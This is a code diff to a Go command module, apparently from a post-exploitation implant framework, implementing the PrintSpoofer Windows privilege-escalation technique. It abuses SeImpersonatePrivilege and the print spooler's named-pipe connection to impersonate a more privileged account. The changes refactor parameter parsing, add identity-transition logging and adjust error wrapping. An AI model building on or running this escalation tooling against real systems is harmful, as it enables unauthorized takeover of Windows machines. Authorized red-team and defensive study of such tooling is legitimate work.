@@ -6,7 +6,6 @@ package commands
 import (
 	"crypto/rand"
 	"encoding/hex"
-	"encoding/json"
 	"fmt"
 	"runtime"
 	"strings"
@@ -40,11 +39,9 @@ var (
 )
 
 func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
-	var args printSpooferArgs
-	if task.Params != "" {
-		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return errorf("Invalid parameters: %v", err)
-		}
+	args, parseErr := unmarshalParams[printSpooferArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 	if args.Timeout == 0 {
 		args.Timeout = 30
@@ -54,6 +51,9 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 	if !checkPrivilege("SeImpersonatePrivilege") {
 		return errorResult("SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).")
 	}
+
+	// Capture current identity for transition history
+	oldIdentity, _ := GetCurrentIdentity()
 
 	// Get computer name for the printer path.
 	var compNameBuf [windows.MAX_COMPUTERNAME_LENGTH + 1]uint16
@@ -293,6 +293,10 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 
 		osThreadLocked = true
 
+		// Record identity transition for history
+		RecordIdentityTransition("printspoofer", oldIdentity, clientIdentity,
+			fmt.Sprintf("pipe=%s", pipePath))
+
 		var sb strings.Builder
 		sb.WriteString("=== PRINTSPOOFER SUCCESS ===\n\n")
 		sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipePath))
@@ -360,7 +364,7 @@ func triggerSpooler(printerName string) error {
 	//   53   = ERROR_BAD_NETPATH (path resolution failed)
 	// In all cases the spooler may still have connected to our pipe.
 	if ret == 0 && callErr != nil {
-		return fmt.Errorf("OpenPrinterW(%s): %v", printerName, callErr)
+		return fmt.Errorf("OpenPrinterW(%s): %w", printerName, callErr)
 	}
 
 	return nil
